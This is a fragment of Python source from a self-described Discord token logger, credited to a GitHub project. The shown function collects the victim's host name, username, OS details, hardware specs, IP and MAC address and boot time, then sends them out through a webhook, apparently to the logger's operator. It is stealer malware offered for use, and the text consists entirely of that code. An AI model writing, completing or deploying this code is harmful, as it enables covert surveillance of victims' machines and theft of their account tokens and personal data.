# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger


# System Info Script
def System_info():
    try:
        uname = platform.uname()
        boot_time = psutil.boot_time()
        cpu_freq = psutil.cpu_freq()
        virtual_mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')

        info = (
            f"**System Info**\n"
            f"PC Name: `{socket.gethostname()}`\n"
            f"User: `{getpass.getuser()}`\n"
            f"OS: `{uname.system} {uname.release}`\n"
            f"Version: `{uname.version}`\n"
            f"Machine: `{uname.machine}`\n"
            f"Processor: `{uname.processor}`\n"
            f"CPU Cores (Physical/Logical): `{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)}`\n"
            f"CPU Frequency: `{cpu_freq.current:.2f} MHz`\n"
            f"RAM Total: `{convert_bytes(virtual_mem.total)}`\n"
            f"Disk Total: `{convert_bytes(disk.total)}` | Used: `{convert_bytes(disk.used)}` | Free: `{convert_bytes(disk.free)}`\n"
            f"IP Address: `{get_ip()}`\n"
            f"MAC Address: `{get_mac()}`\n"
            f"System Boot Time: `<t:{int(boot_time)}:F>`\n"
        )
        send_webhook(info, title="", encrypt=False)
    except Exception as e:
        print(f"Failed to collect system info: {e}")